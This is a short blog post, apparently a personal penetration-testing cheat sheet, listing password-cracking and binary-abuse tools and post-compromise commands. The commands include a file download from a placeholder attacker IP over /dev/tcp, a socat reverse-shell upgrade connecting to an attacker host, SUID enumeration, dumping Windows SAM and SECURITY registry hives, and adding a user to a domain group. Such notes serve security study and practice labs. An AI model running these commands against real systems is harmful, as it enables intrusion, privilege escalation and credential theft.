---
layout: post
title: Common Tools and Commands
author: Mitchell Stein
tags:

jekyll theme

jekyll
date: 2022-03-27
tags: []
categories: [Toolkit]
toc:  true
---

# Tools

Find common vulnerabilities in Unix binaries

- [GTFOBins](https://gtfobins.github.io)

Crack known password hashes (ONLY USE ON PRACTICE MACHINES)

- [CrackStation](https://crackstation.net)

---

# Commands

## Post-Shell Enumeration

### linux

Find all files owned by a user in Linux, disregarding /proc and /sys files

- `find / -user <username> -ls 2>/dev/null`

Find all SUID binaries for the current user:

- `find / -type f -perm -04000 -ls 2>/dev/null`

Download files with bash

- `bash -c "cat < /dev/tcp/[Attacker IP]/[Attacker Port]" > [file]`

Upgrade reverse shell

- Using socat

  - On target: `` socat file:`tty`,raw,echo=0 tcp-listen:4444 ``
  - On attacker: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackerip>:4444`

- Using Python
  - On target: `python -c 'import pty; pty.spawn("/bin/bash")'`

View neighbor computer IPs

- `ip ne`
- `"ip -br -c ne`

### Windows

Harvest SAM:

- `reg.exe save hklm\sam c:\temp\sam.save`
- `reg.exe save hklm\security c:\temp\security.save`
- `reg.exe save hklm\system c:\temp\system.save`

Add current user to group

- `net group "<group>" <username> /add /domain`

Get user/domain SID:

- `whoami /user`
